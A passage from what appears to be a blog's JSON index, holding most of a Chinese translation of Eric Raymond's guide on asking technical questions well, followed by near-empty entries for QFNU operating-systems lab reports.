。不要全部用大写，这会被视为无礼的大声嚷嚷（全部小写也好不到哪去，因为不易阅读。Alan Cox也许可以这样做，但你不行。）\n更白话的说，如果你写得像是个半文盲[译注：小白]），那多半得不到理睬。也不要使用即时通讯中的简写或火星文，如将的 简化为ㄉ 会使你看起来像一个为了少打几个键而省字的小白。更糟的是，如果像个小孩似地鬼画符那绝对是在找死，可以肯定没人会理你（或者最多是给你一大堆指责与挖苦）。\n如果在使用非母语的论坛提问，你可以犯点拼写和语法上的小错，但决不能在思考上马虎（没错，我们 通常能弄清两者的分别）。同时，除非你知道回复者使用的语言，否则请使用英语书写。繁忙的黑客一 般会直接删除用他们看不懂语言写的消息。在网络上英语是通用语言，用英语书写可以将你的问题在尚 未被阅读就被直接删除的可能性降到最低。\n如果英文是你的外语（Second language），提示潜在回复者你有潜在的语言困难是很好的： [译注：以下附上原文以供使用]\n\nEnglish is not my native language; please excuse typing errors.\n\n\n英文不是我的母语，请原谅我的错字或语法\n\n\nIf you speak $LANGUAGE, please email&#x2F;PM me; \nI may need assistance translating my question.\n\n\n如果你说某语言，请寄信&#x2F;私讯给我；我需要有人协助我翻译我的问题\n\n\nI’ve posted my question in $LANGUAGE and English. \nI’ll be glad to translate responses, if you only use one or the other.\n\n\n我把我的问题用某语言和英文写出来，如果你只用一种语言回答，我会乐意将其翻译成另一种。\n\n使用易于读取且标准的文件格式发送问题如果你人为地将问题搞得难以阅读，它多半会被忽略，人们更愿读易懂的问题，所以：\n\n使用纯文字而不是HTML (关闭HTML并不难）\n\n使用MIME附件通常是可以的，前提是真正有内容（譬如附带的源代码或patch），而不仅仅是邮件 程序生成的模板（譬如只是信件内容的拷贝）。 \n\n不要发送一段文字只是单行句子但多次断行的邮件（这使得回复部分内容非常困难）。设想你的读 者是在80个字符宽的终端机上阅读邮件，最好设置你的断行点小于80字。 \n\n但是，也不要用任何固定断行资料（譬如日志档案拷贝或会话记录）。档案应该原样包含，让回复 者有信心他们看到的是和你看到的一样的东西。 \n\n在英语论坛中，不要使用 Quoted-Printable MIME编码发送消息。这种编码对于张贴非ASCII语言 可能是必须的，但很多邮件程序并不支持这种编码。当它们分断时，那些文本中四处散布的 =20 符 号既难看也分散注意力，甚至有可能破坏内容的语意。 \n\n绝对，永远不要指望黑客们阅读使用封闭格式编写的文档，像是微软公司的Word或Excel文件等。 大多数黑客对此的反应就像有人将还在冒热气的猪粪倒在你门口阶梯上时你的反应一样。即便他们 能够处理，他们也很厌恶这么做。\n\n如果你从使用Windows的电脑发送电子邮件，关闭微软愚蠢的 智能引号 功能 （从[选项] &gt; [校订] &gt; [自动校正选项], 按掉 智能引号 单选框），以免在你的邮件中到处散布垃圾字符。\n\n在论坛，勿滥用 表情符号 和 HTML 功能（当它们提供时）。一两个表情符号通常没有问题，但花哨 的彩色文本倾向于使人认为你是个无能之辈。过滥地使用表情符号、色彩和字体会使你看来像个傻 笑的小姑娘。这通常不是个好主意，除非你只是对sex而不是有用的回复更有兴趣。\n\n\n如果你使用图形用户界面的邮件程序（如微软公司的Outlook或者其它类似的），注意它们的默认设置 不一定满足这些要求。大多数这类程序有基于选单的 查看源代码 命令，用它来检查发送文件夹中的消 息，以确保发送的是没有多餘杂质的纯文本文件。\n精确的描述问题并言之有物\n仔细、清楚地描述你的问题或Bug的症状。\n\n描述问题发生的环境（机器配置、操作系统、应用程序、以及相关的信息），提供经销商的发行版 和版本号（如： Fedora Core 4 、 Slackware 9.1 等）。\n\n描述在提问前你是怎样去研究和理解这个问题的。\n\n描述在提问前为确定问题而采取的诊断步骤。\n\n描述最近做过什么可能相关的硬件或软件变更。 \n\n尽可能的提供一个可以 重现这个问题的既定环境 的方法\n\n\n尽量去揣测一个黑客会怎样反问你，在他提问的时候预先给他答案。\n以上几点中，当你报告的是你认为可能在代码中的问题时，给黑客一个可以重现你的问题的环境尤其重 要。当你这么做时，你得到有效的回答的机会和速度都会大大的提升。\nSimon Tatham写过一篇名为《如何有效的报告Bug》的出色文章。强力推荐你也读一读。\n话不在多而在精你需要提供精确有内容的信息。这并不是要求你简单的把成堆的出错代码或者资料完全转录到你的提问中。如果你有庞大而复杂的测试样例能重现程序挂掉的情境，尽量将它剪裁得越小越好。\n这样做的用处至少有三点。\n第一，表现出你为简化问题付出了努力，这可以使你得到回答的机会增加；\n第二，简化问题使你更有可能得到有用的答案；\n第三，在精炼你的bug报告的过程中，你很可能就自己找到了解决方法或权宜之计。\n别动辄声称找到Bug当你在使用软件中遇到问题，除非你非常、非常的有根据，不要动辄声称找到了Bug。提示：除非你能 提供解决问题的源代码补丁，或者对前一版本的回归测试表现出不正确的行为，否则你都多半不够完全 确信。这同样适用在网页和文件，如果你（声称）发现了文件的 Bug ，你应该能提供相应位置的修正或 替代文件。\n请记得，还有许多其它使用者没遇到你发现的问题，否则你在阅读文件或搜索网页时就应该发现了（你在抱怨前已经做了这些，是吧？）。这也意味着很有可能是你弄错了而不是软件本身有问题。\n编写软件的人总是非常辛苦地使它尽可能完美。如果你声称找到了Bug，也就是在质疑他们的能力，即 使你是对的，也有可能会冒犯到其中某部分人。这尤其严重当你在标题中嚷嚷着有 Bug 。\n提问时，即使你私下非常确信已经发现一个真正的Bug，最好写得像是你做错了什么。如果真的有 Bug，你会在回复中看到这点。这样做的话，如果真有Bug，维护者就会向你道歉，这总比你惹恼别人 然后欠别人一个道歉要好一点。\n可以低声下气，但还是要先做功课有些人明白他们不该粗鲁或傲慢的提问并要求得到答复，但他们选择另一个极端 – 低声下气： 我知道我只是个可悲的新手，一个撸瑟，但... 。这既使人困扰，也没有用，尤其是伴随着与实际问题含糊不清的描 述时更令人反感。\n别用原始灵长类动物的把戏来浪费你我的时间。取而代之的是，尽可能清楚地描述背景条件和你的问题 情况。这比低声下气更好地定位了你的位置。\n有时网页论坛会设有专为新手提问的版面，如果你真的认为遇到了初学者的问题，到那去就是了，但一 样别那么低声下气。\n描述问题症状而非猜测告诉黑客们你认为问题是怎样造成的并没什么帮助。（如果你的推断如此有效，还用向别人求助 吗？），因此要确信你原原本本告诉了他们问题的症状，而不是你的解释和理论；让黑客们来推测和诊 断。如果你认为陈述自己的猜测很重要，清楚地说明这只是你的猜测，并描述为什么它们不起作用。\n蠢问题\n\n我在编译内核时接连遇到 SIG11 错误， \n我怀疑某条飞线搭在主板的走线上了，这种情况应该怎样检查最好？\n\n聪明问题\n\n我的组装电脑是 FIC-PA2007 主机板搭载 AMD K6&#x2F;233 CPU（威盛 Apollo VP2芯片组）， 256MB Corsair PC133 SDRAM内存，在编译内核时，从开机20分钟以后就频频产生 SIG11 错误， \n但是在头20分钟内从没发生过相同的问题。重新启动也没有用，但是关机一晚上就又能工作20分钟。\n所有内存都换过了，没有效果。相关部分的标准编译记录如下…。\n\n由于以上这点似乎让许多人觉得难以配合，这里有句话可以提醒你： 所有的诊断专家都来自密苏里州。 美国国务院的官方座右铭则是： 让我看看 （出自国会议员 Willard D. Vandiver 在1899年时的讲话： 我来自一个出产玉米，棉花，牛蒡和民主党人的国家，滔滔雄辩既不能说服我，也不会让我满意。我来自密苏里州，你必须让我看看。 ） 针对诊断者而言，这并不是一种怀疑，而只是一种真实而有用的需求，以便让他们看 到的是与你看到的原始证据尽可能一致的东西，而不是你的猜测与归纳的结论。所以，大方的展示给我 们看吧！\n按发生时间先后列出问题症状问题发生前的一系列操作，往往就是对找出问题最有帮助的线索。因此，你的说明里应该包含你的操作 步骤，以及机器和软件的反应，直到问题发生。在命令行处理的情况下，提供一段操作记录（例如运行 脚本工具所生成的），并引用相关的若干行（如20行）记录会非常有帮助。\n如果挂掉的程序有诊断选项（如 -v 的详述开关），试着选择这些能在记录中增加调试信息的选项。记住， 多 不等于 好 。试着选取适当的调试级别以便提供有用的信息而不是让读者淹没在垃圾中。\n如果你的说明很长（如超过四个段落），在开头简述问题，接下来再按时间顺序详述会有所帮助。这样 黑客们在读你的记录时就知道该注意哪些内容了。\n描述目标而不是过程如果你想弄清楚如何做某事（而不是报告一个Bug），在开头就描述你的目标，然后才陈述重现你所卡 住的特定步骤。\n经常寻求技术帮助的人在心中有个更高层次的目标，而他们在自以为能达到目标的特定道路上被卡住 了，然后跑来问该怎么走，但没有意识到这条路本身就有问题。结果要费很大的劲才能搞定。\n蠢问题\n\n我怎样才能从某绘图程序的颜色选择器中取得十六进制的的RGB值？\n\n聪明问题\n\n我正试着用替换一幅图片的色码成自己选定的色码，我现在知道的唯一方法是编辑每个色码区块， 但却无法从某绘图程序的颜色选择器取得十六进制的的RGB值。\n\n第二种提问法比较聪明，你可能得到像是 建议采用另一个更合适的工具 的回复。\n别要求使用私人电邮回复黑客们认为问题的解决过程应该公开、透明，此过程中如果更有经验的人注意到不完整或者不当之处， 最初的回复才能够、也应该被纠正。同时，作为提供帮助者也能因为能力和学识被其它同行看到而得到 某种奖励。\n当你要求私下回复时，这个过程和奖励都被中止。别这样做，让回复者来决定是否私下回答 – 如果他真 这么做了，通常是因为他认为问题编写太差或者太肤浅，以至于对其它人没有兴趣。\n这条规则存在一条有限的例外，如果你确信提问可能会引来大量雷同的回复时，那么这个神奇的提问句 会是向我发电邮，我将为论坛归纳这些回复 。试着将邮件列表或新闻群组从洪水般的雷同回复中解救出来 是非常有礼貌的 – 但你必须信守诺言。\n清楚明确的表达你的问题以及需求漫无边际的提问近乎无休无止的时间黑洞。最有可能给你有用答案的人通常也正是最忙的人（他们忙是 因为要亲自完成大部分工作）。这样的人对无节制的时间黑洞相当厌恶，所以他们也倾向于厌恶那些漫 无边际的提问。\n如果你明确表述需要回答者做什么（如提供指点、发送一段代码、检查你的补丁、或是其他等等），就 最有可能得到有用的答案。因为这会定出一个时间和精力的上限，便于回答者能集中精力来帮你。这么 做很棒。\n要理解专家们所处的世界，请把专业技能想像为充裕的资源，而回复的时间则是稀缺的资源。你要求他 们奉献的时间越少，你越有可能从真正专业而且很忙的专家那里得到解答。\n所以，界定一下你的问题，使专家花在辨识你的问题和回答所需要付出的时间减到最少，这技巧对你有 用答案相当有帮助 – 但这技巧通常和简化问题有所区别。因此，问 我想更好的理解X，可否指点一下哪有好 一点说明？ 通常比问 你能解释一下X吗？ 更好。如果你的代码不能运作，通常请别人看看哪里有问题，比 要求别人替你改正要明智得多。\n询问有关代码的问题时别要求他人帮你有问题的代码调试而不提示一下应该从何入手。张贴几百行的代码，然后说一声： 它不会动 会让你完全被忽略。只贴几十行代码，然后说一句： 在第七行以后，我期待它显示&lt;x&gt; ，但实际出现的是&lt;y&gt;比较有可能让你得到回应。\n最有效描述程序问题的方法是提供最精简的Bug展示测试示例（bug-demonstrating test case）。什么是最精简的测试示例? 那是问题的缩影；一小个程序片段能刚好展示出程序的异常行为，而不包含其他令人分散注意力的内容。怎么制作最精简的测试示例？如果你知道哪一行或哪一段代码会造成异常的行为，复制下来并加入足够重现这个状况的代码（例如，足以让这段代码能被编译&#x2F;直译&#x2F;被应用程序处理）。如果你无法将问题缩减到一个特定区块，就复制一份代码并移除不影响产生问题行为的部分。总之，测试示例越小越好（查看话不在多而在精一节）。\n一般而言，要得到一段相当精简的测试示例并不太容易，但永远先尝试这样做的是种好习惯。这种方式可以帮助你了解如何自行解决这个问题 —- 而且即使你的尝试不成功，黑客们也会看到你在尝试取得答案的过程中付出了努力，这可以让他们更愿意与你合作。\n如果你只是想让别人帮忙审查（Review）一下代码，在信的开头就要说出来，并且一定要提到你认为哪一部分特别需要关注以及为什么。\n别把自己家庭作业的问题贴上来黑客们很擅长分辨哪些问题是家庭作业式的问题；因为我们中的大多数都曾自己解决这类问题。同样， 这些问题得由你来搞定，你会从中学到东西。你可以要求给点提示，但别要求得到完整的解决方案。\n如果你怀疑自己碰到了一个家庭作业式的问题，但仍然无法解决，试试在使用者群组，论坛或（最后一 招）在项目的使用者邮件列表或论坛中提问。尽管黑客们会看出来，但一些有经验的使用者也许仍会给 你一些提示。\n去掉无意义的提问句避免用无意义的话结束提问，例如有人能帮我吗？ 或者这有答案吗？ 。\n首先：如果你对问题的描述不是很好，这样问更是画蛇添足。\n其次：由于这样问是画蛇添足，黑客们会很厌烦你 – 而且通常会用逻辑上正确，但毫无意义的回答来表示他们的蔑视， 例如：没错，有人能帮你 或者不，没答案 。\n一般来说，避免用 是或否 、对或错 、有或没有 类型的问句，除非你想得到是或否类型的回答。\n即使你很急也不要在标题写紧急这是你的问题，不是我们的。宣称 紧急 极有可能事与愿违：大多数黑客会直接删除无礼和自私地企图即 时引起关注的问题。更严重的是， 紧急 这个字（或是其他企图引起关注的标题）通常会被垃圾信过滤器 过滤掉 – 你希望能看到你问题的人可能永远也看不到。\n有半个例外的情况是，如果你是在一些很高调，会使黑客们兴奋的地方，也许值得这样去做。在这种情 况下，如果你有时间压力，也很有礼貌地提到这点，人们也许会有兴趣回答快一点。\n当然，这风险很大，因为黑客们兴奋的点多半与你的不同。譬如从 NASA 国际空间站（International Space Station）发这样的标题没有问题，但用自我感觉良好的慈善行为或政治原因发肯定不行。事实 上，张贴诸如 紧急：帮我救救这个毛绒绒的小海豹！ 肯定让你被黑客忽略或惹恼他们，即使他们认为毛绒 绒的小海豹很重要。\n礼多人不怪，而且有时还很有帮助彬彬有礼，多用 请 和 谢谢您的关注 ，或 谢谢你的关照 。让大家都知道你对他们花时间免费提供帮助心存感激。\n坦白说，这一点并没有比清晰、正确、精准并合法语法和避免使用专用格式重要（也不能取而代之）。 黑客们一般宁可读有点唐突但技术上鲜明的Bug报告，而不是那种有礼但含糊的报告。（如果这点让你 不解，记住我们是按问题能教我们什么来评价问题的价值的）\n然而，如果你有一串的问题待解决，客气一点肯定会增加你得到有用回应的机会。\n （我们注意到，自从本指南发布后，从资深黑客那里得到的唯一严重缺陷反馈，就是对预先道谢这一 条。一些黑客觉得 先谢了 意味着事后就不用再感谢任何人的暗示。我们的建议是要么先说 先谢了 ，然后 事后再对回复者表示感谢，或者换种方式表达感激，譬如用 谢谢你的关注 或 谢谢你的关照 。）\n问题解决后，加个简短的补充说明问题解决后，向所有帮助过你的人发个说明，让他们知道问题是怎样解决的，并再一次向他们表示感谢。如果问题在新闻组或者邮件列表中引起了广泛关注，应该在那里贴一个说明比较恰当。\n最理想的方式是向最初提问的话题回复此消息，并在标题中包含已修正 ，已解决 或其它同等含义的明显标记。在人来人往的邮件列表里，一个看见讨论串问题 X 和问题的X - 已解决 的潜在回复者就明白不用再浪费时间了（除非他个人觉得问题 X 的有趣），因此可以利用此时间去解决其它问题。\n补充说明不必很长或是很深入；简单的一句你好，原来是网线出了问题！谢谢大家 – Bill 比什么也不说要来的好。事实上，除非结论真的很有技术含量，否则简短可爱的小结比长篇大论更好。说明问题是怎样解决的，但大可不必将解决问题的过程复述一遍。\n对于有深度的问题，张贴调试记录的摘要是有帮助的。描述问题的最终状态，说明是什么解决了问题， 在此之后才指明可以避免的盲点。避免盲点的部分应放在正确的解决方案和其它总结材料之后，而不要 将此信息搞成侦探推理小说。列出那些帮助过你的名字，会让你交到更多朋友。\n除了有礼貌和有内涵以外，这种类型的补充也有助于他人在邮件列表&#x2F;新闻群组&#x2F;论坛中搜索到真正解决你问题的方案，让他们也从中受益。\n至少，这种补充有助于让每位参与协助的人因问题的解决而从中得到满足感。如果你自己不是技术专家或者黑客，那就相信我们，这种感觉对于那些你向他们求助的大师或者专家而言，是非常重要的。问题悬而未决会让人灰心；黑客们渴望看到问题被解决。好人有好报，满足他们的渴望，你会在下次提问时尝到甜头。\n思考一下怎样才能避免他人将来也遇到类似的问题，自问写一份文件或加个常见问题（FAQ）会不会有帮助。如果是的话就将它们发给维护者。\n在黑客中，这种良好的后继行动实际上比传统的礼节更为重要，也是你如何透过善待他人而赢得声誉的方式，这是非常有价值的资产。\n如何解读答案RTFM和STFW：如何知道你已完全搞砸了有一个古老而神圣的传统：如果你收到 RTFM （Read The Fucking Manual） 的回应，回答者认为你应该去读他妈的手册。当然，基本上他是对的，你应该去读一读。\nRTFM 有一个年轻的亲戚。如果你收到 STFW（Search The Fucking Web） 的回应，回答者认为你应该到他妈的网上搜索过了。那人多半也是对的，去搜索一下吧。（更温和一点的说法是Google是你的朋友\n在论坛，你也可能被要求去爬爬论坛的旧文。事实上，有人甚至可能热心地为你提供以前解决此问题的讨论串。但不要依赖这种关照，提问前应该先搜索一下旧文。\n通常，用这两句之一回答你的人会给你一份包含你需要内容的手册或者一个网址，而且他们打这些字的时候也正在读着。这些答复意味着回答者认为\n\n你需要的信息非常容易获得； \n你自己去搜索这些信息比灌给你能让你学到更多。\n\n你不应该因此不爽；依照黑客的标准，他已经表示了对你一定程度的关注，而没有对你的要求视而不见。你应该对他祖母般的慈祥表示感谢。\n如果还是搞不懂如果你看不懂回应，别立刻要求对方解释。像你以前试着自己解决问题时那样（利用手册，FAQ，网 络，身边的高手），先试着去搞懂他的回应。如果你真的需要对方解释，记得表现出你已经从中学到了 点什么。\n比方说，如果我回答你： 看来似乎是 zentry 卡住了；你应该先清除它。 ，然后，这是一个很糟的后续问 题回应： zentry是什么？ 好的问法应该是这样： 哦~~~我看过说明了但是只有 -z 和 -p 两个参数中提到了 zentries，而且还都没有清楚的解释如何清除它。你是指这两个中的哪一个吗？还是我看漏了什么？\n处理无礼的回应很多黑客圈子中看似无礼的行为并不是存心冒犯。相反，它是直接了当，一针见血式的交流风格，这种 风格更注重解决问题，而不是使人感觉舒服而却模模糊糊。\n如果你觉得被冒犯了，试着平静地反应。如果有人真的做了出格的事，邮件列表、新闻群组或论坛中的 前辈多半会招呼他。如果这没有发生而你却发火了，那么你发火对象的言语可能在黑客社区中看起来是 正常的，而你将被视为有错的一方，这将伤害到你获取信息或帮助的机会。\n另一方面，你偶而真的会碰到无礼和无聊的言行。与上述相反，对真正的冒犯者狠狠地打击，用犀利的 语言将其驳得体无完肤都是可以接受的。然而，在行事之前一定要非常非常的有根据。纠正无礼的言论 与开始一场毫无意义的口水战仅一线之隔，黑客们自己莽撞地越线的情况并不鲜见。如果你是新手或外 人，避开这种莽撞的机会并不高。如果你想得到的是信息而不是消磨时光，这时最好不要把手放在键盘 上以免冒险。\n（有些人断言很多黑客都有轻度的自闭症或亚斯伯格综合症，缺少用于润滑人类社会正常交往所需的神 经。这既可能是真也可能是假的。如果你自己不是黑客，兴许你认为我们脑袋有问题还能帮助你应付我 们的古怪行为。只管这么干好了，我们不在乎。我们喜欢我们现在这个样子，并且通常对病患标记都有 站得住脚的怀疑。）\n在下一节，我们会谈到另一个问题，当你行为不当时所会受到的 冒犯 。\n如何避免扮演失败者黑客社区的论坛中有那么几次你可能会搞砸 – 以本指南所描述到的或类似的方式。而你会在公开场合中被告知你是如何搞砸的，也许攻击的言语中还会带点夹七夹八的颜色。\n这种事发生以后，你能做的最糟糕的事莫过于哀嚎你的遭遇、宣称被口头攻击、要求道歉、高声尖叫、憋闷气、威胁诉诸法律、向其雇主报怨、忘了关马桶盖等等。相反地，你该这么做：\n熬过去，这很正常。事实上，它是有益健康且合理的。\n社区的标准不会自行维持，它们是通过参与者积极而公开地执行来维持的。不要哭嚎所有的批评都应该 通过私下的邮件传送，它不是这样运作的。当有人评论你的一个说法有误或者提出不同看法时，坚持声 称受到个人攻击也毫无益处，这些都是失败者的态度。\n也有其它的黑客论坛，受过高礼节要求的误导，禁止参与者张贴任何对别人帖子挑毛病的消息，并声称 如果你不想帮助用户就闭嘴。 结果造成有想法的参与者纷纷离开，这么做只会使它们沦为毫无意义的嘮叨 与无用的技术论坛。\n夸张的讲法是：你要的是友善（以上述方式）还是有用？两个里面挑一个。\n记着：当黑客说你搞砸了，并且（无论多么刺耳）告诉你别再这样做时，他正在为关心你和他的社区而行动。对他而言，不理你并将你从他的生活中滤掉更简单。如果你无法做到感谢，至少要表现地有点尊 严，别大声哀嚎，也别因为自己是个有戏剧性超级敏感的灵魂和自以为有资格的新来者，就指望别人像 对待脆弱的洋娃娃那样对你。\n有时候，即使你没有搞砸（或者只是在他的想像中你搞砸了），有些人也会无缘无故地攻击你本人。在这种情况下，抱怨倒是真的会把问题搞砸。\n这些来找麻烦的人要么是毫无办法但自以为是专家的不中用家伙，要么就是测试你是否真会搞砸的心理 专家。其它读者要么不理睬，要么用自己的方式对付他们。这些来找麻烦的人在给他们自己找麻烦，这 点你不用操心。\n也别让自己卷入口水战，最好不要理睬大多数的口水战 – 当然，是在你检验它们只是口水战，而并未指 出你有搞砸的地方，且也没有巧妙地将问题真正的答案藏于其后（这也是有可能的）。\n不该问的问题以下是几个经典蠢问题，以及黑客没回答时心中所想的：\n问题：我能在哪找到 X 程序或 X 资源？\n问题：我怎样用 X 做 Y？\n问题：如何设定我的 shell 提示？\n问题：我可以用 Bass-o-matic 文件转换工具将 AcmeCorp 档案转换为 TeX 格式吗？\n问题：我的程序、设定、SQL语句没有用\n问题：我的 Windows 电脑有问题，你能帮我吗？\n问题：我的程序不会动了，我认为系统工具 X 有问题\n问题：我在安装 Linux（或者 X ）时有问题，你能帮我吗？\n问题：我怎么才能破解 root 帐号&#x2F;窃取 OP 特权&#x2F;读别人的邮件呢？\n\n\n问题：我能在哪找到X程序或X资源？\n回答：就在我找到它的地方啊，白痴 – 搜索引擎的那一头。天哪！难道还有人不会用 Google 吗？\n\n问题：我怎样用X做Y？\n回答：如果你想解决的是 Y ，提问时别给出可能并不恰当的方法。这种问题说明提问者不但对 X 完全无知，也对 Y 要解决的问题糊涂，还被特定形势禁锢了思维。最好忽略这种人，等他们把问题搞清楚了再说。\n\n问题：如何设定我的shell提示？\n回答：如果你有足够的智慧提这个问题，你也该有足够的智慧去 RTFM，然后自己去找出来。\n\n问题：我可以用Bass-o-matic文件转换工具将AcmeCorp档案转换为TeX格式吗？\n回答：试试看就知道了。如果你试过，你既知道了答案，就不用浪费我的时间了。\n\n问题：我的程序、设定、SQL语句没有用\n回答：这不算是问题吧，我对要我问你二十个问题才找得出你真正问题的问题没兴趣 – 我有更有意思的 事要做呢。在看到这类问题的时候，我的反应通常不外如下三种\n\n你还有什么要补充的吗？ \n真糟糕，希望你能搞定。 \n这关我有什么屁事？\n\n\n问题：我的Windows电脑有问题，你能帮我吗？\n回答：能啊，扔掉萎软的垃圾，换个像 Linux 或 BSD 的开放源代码操作系统吧。\n注意：如果程序有官方版 Windows 或者与 Windows 有互动（如Samba），你可以问与Windows相关 的问题， 只是别对问题是由 Windows 操作系统而不是程序本身造成的回复感到惊讶， 因为 Windows 一般来说实在太烂，这种说法通常都是对的。\n\n问题：我的程序不会动了，我认为系统工具X有问题\n回答：你完全有可能是第一个注意到被成千上万用户反复使用的系统调用与函数库档案有明显缺陷的 人，更有可能的是你完全没有根据。不同凡响的说法需要不同凡响的证据，当你这样声称时，你必须有 清楚而详尽的缺陷说明文件作后盾。\n\n问题：我在安装Linux（或者X）时有问题，你能帮我吗？\n回答：不能，我只有亲自在你的电脑上动手才能找到毛病。还是去找你当地的 Linux 使用群组者寻求实际的指导吧（你能在这儿找到使用者群组的清单）。\n注意：如果安装问题与某 Linux 的发行版有关，在它的邮件列表、论坛或本地使用者群组中提问也许是 恰当的。此时，应描述问题的准确细节。在此之前，先用 Linux 和所有被怀疑的硬件作关键词仔细搜索。\n\n问题：我怎么才能破解root帐号、窃取OP特权、读别人的邮件呢？\n回答：想要这样做，说明了你是个卑鄙小人；想找个黑客帮你，说明你是个白痴！\n好问题与蠢问题最后，我将透过举一些例子，来说明怎样聪明的提问；同一个问题的两种问法被放在一起，一种是愚蠢 的，另一种才是明智的。\n蠢问题：\n\n我可以在哪儿找到关于 Foonly Flurbamatic 的资料？\n\n这种问法无非想得到 STFW 这样的回答。\n聪明问题：\n\n我用Google搜索过 “Foonly Flurbamatic 2600”，但是没找到有用的结果。谁知道上哪儿去找对这 种设备编程的资料？ \n\n这个问题已经 STFW 过了，看起来他真的遇到了麻烦。\n 蠢问题 \n\n我从 foo 项目找来的源码没法编译。它怎么这么烂？ \n\n他觉得都是别人的错，这个傲慢自大的提问者 \n聪明问题 \n\nfoo 项目代码在 Nulix 6.2 版下无法编译通过。我读过了 FAQ，但里面没有提到跟 Nulix 有关的问 题。这是我编译过程的记录，我有什么做的不对的地方吗？ \n\n提问者已经指明了环境，也读过了FAQ，还列出了错误，并且他没有把问题的责任推到别人头上，他的 问题值得被关注。\n蠢问题 \n\n我的主机板有问题了，谁来帮我？ \n\n某黑客对这类问题的回答通常是： 好的，还要帮你拍拍背和换尿布吗？ ，然后按下删除键。\n聪明问题\n\n我在 S2464 主机板上试过了 X 、 Y 和 Z ，但没什么作用，我又试了 A 、 B 和 C 。请注意当我尝 试 C 时的奇怪现象。显然 florbish 正在 grommicking，但结果出人意料。通常在 Athlon MP 主机 板上引起 grommicking 的原因是什么？有谁知道接下来我该做些什么测试才能找出问题？\n\n这个家伙，从另一个角度来看，值得去回答他。他表现出了解决问题的能力，而不是坐等天上掉答案。 在最后一个问题中，注意 告诉我答案 和 给我启示，指出我还应该做什么诊断工作 之间微妙而又重要的区别。\n事实上，后一个问题源自于 2001 年 8 月在 Linux 内核邮件列表（lkml）上的一个真实的提问。我 （Eric）就是那个提出问题的人。我在 Tyan S2464 主板上观察到了这种无法解释的锁定现象，列表成员 们提供了解决这一问题的重要信息。\n通过我的提问方法，我给了别人可以咀嚼玩味的东西；我设法让人们很容易参与并且被吸引进来。我显 示了自己具备和他们同等的能力，并邀请他们与我共同探讨。通过告诉他们我所走过的弯路，以避免他 们再浪费时间，我也表明了对他们宝贵时间的尊重。\n事后，当我向每个人表示感谢，并且讚赏这次良好的讨论经歷的时候， 一个 Linux 内核邮件列表的成员 表示，他觉得我的问题得到解决并非由于我是这个列表中的名人，而是因为我用了正确的方式来提问。\n黑客从某种角度来说是拥有丰富知识但缺乏人情味的家伙；我相信他是对的，如果我像个乞讨者那样提 问，不论我是谁，一定会惹恼某些人或者被他们忽视。他建议我记下这件事，这直接导致了本指南的出 现。\n如果得不到回答如果仍得不到回答，请不要以为我们觉得无法帮助你。有时只是看到你问题的人不知道答案罢了。没有回应不代表你被忽视，虽然不可否认这种差别很难区分。\n总的来说，简单的重复张贴问题是个很糟的点子。这将被视为无意义的喧闹。有点耐心，知道你问题答案的人可能生活在不同的时区，可能正在睡觉，也有可能你的问题一开始就没有组织好。\n你可以通过其他渠道获得帮助，这些渠道通常更适合初学者的需要。\n有许多网上的以及本地的使用者群组，由热情的软件爱好者（即使他们可能从没亲自写过任何软件）组成。通常人们组建这样的团体来互相帮助并帮助新手。\n另外，你可以向很多商业公司寻求帮助，不论公司大还是小。别为要付费才能获得帮助而感到沮丧！毕竟，假使你的汽车发动机汽缸密封圈爆掉了– 完全可能如此 –你还得把它送到修车铺，并且为维修付费。就算软件没花费你一分钱，你也不能强求技术支持总是免费的。\n对像是 Linux 这种大众化的软件，每个开发者至少会对应到上万名使用者。根本不可能由一个人来处理来自上万名使用者的求助电话。要知道，即使你要为这些协助付费，和你所购买的同类软件相比，你所付出的也是微不足道的（通常封闭源代码软件的技术支持费用比开放源代码软件的要高得多，且内容也没那么丰富）。\n如何更好地回答问题态度和善一点。问题带来的压力常使人显得无礼或愚蠢，其实并不是这样。\n对初犯者私下回复。对那些坦诚犯错之人没有必要当众羞辱，一个真正的新手也许连怎么搜索或在哪找 常见问题都不知道。\n如果你不确定，一定要说出来！一个听起来权威的错误回复比没有还要糟，别因为听起来像个专家很好 玩，就给别人乱指路。要谦虚和诚实，给提问者与同行都树个好榜样。\n如果帮不了忙，也别妨碍他。不要在实际步骤上开玩笑，那样也许会毁了使用者的设置 –有些可怜的呆 瓜会把它当成真的指令。\n试探性的反问以引出更多的细节。如果你做得好，提问者可以学到点东西 –你也可以。试试将蠢问题转 变成好问题，别忘了我们都曾是新手。\n尽管对那些懒虫抱怨一声 RTFM 是正当的，能指出文件的位置（即使只是建议个 Google 搜索关键词） 会更好。\n如果你决定回答，就请给出好的答案。当别人正在用错误的工具或方法时别建议笨拙的权宜之计 （wordaround），应推荐更好的工具，重新界定问题。\n正面的回答问题！如果这个提问者已经很深入的研究而且也表明已经试过 X 、 Y 、 Z 、 A 、 B 、 C 但 没得到结果，回答 试试看 A 或是 B 或者 试试X 、 Y 、 Z 、 A 、 B 、 C 并附上一个链接一点用都 没有。\n帮助你的社区从问题中学习。当回复一个好问题时，问问自己 如何修改相关文件或常见问题文件以免再次解 答同样的问题？ ，接着再向文件维护者发一份补丁。\n如果你是在研究一番后才做出的回答，展现你的技巧而不是直接端出结果。毕竟 授人以鱼不如授人以渔 。\n相关资源如果你需要个人电脑、Unix 系统和网络如何运作的基础知识，参阅Unix系统和网络基本原理。\n当你发布软件或补丁时，试着按软件发布实践操作。\n鸣谢Evelyn Mitchel贡献了一些愚蠢问题例子并启发了编写 如何更好地回答问题 这一节， Mikhail Ramendik 贡献了一些特别有价值的建议和改进。\n","categories":["随笔"],"tags":["提问的智慧","How-to-ask"]},{"title":"操作系统实验2——操作系统的引导","url":"/posts/68cfe7a7.html","content":"解压文件tar -zxvf hit-oslab-linux-20110823.tar.gz \\  -C /home/shiyanlou/\n\n\n开始实验\n修改字符串长度\n\n\n修改字符串内容\n\n\n编译\n\n\n\n去掉文件头部\n\n\n运行\n\n\n读入 setup.s\n\n\n再次编译\n\n\n注释 build.c\n\n\n\n\n显示获得的参数\n\n\n\n","categories":["QFNU","操作系统","实验报告"],"tags":["QFNU","操作系统"]},{"title":"操作系统实验3——系统调用","url":"/posts/a01ebe19.html","content":"\n\n\n\n\n\n\n\n\n\n\n\n","categories":["QFNU","操作系统","实验报告"],"tags":["QFNU","操作系统"]},{"title":"操作系统实验4——步骤进程运行轨迹的跟踪与统计","url":"/posts/806eec8c.html","content":"挂载\n上传process.c\n修改main.c\n修改printk.c\n修改fork.c\n修改sched.c\n修改exit.c\n启动挂载\n执行make 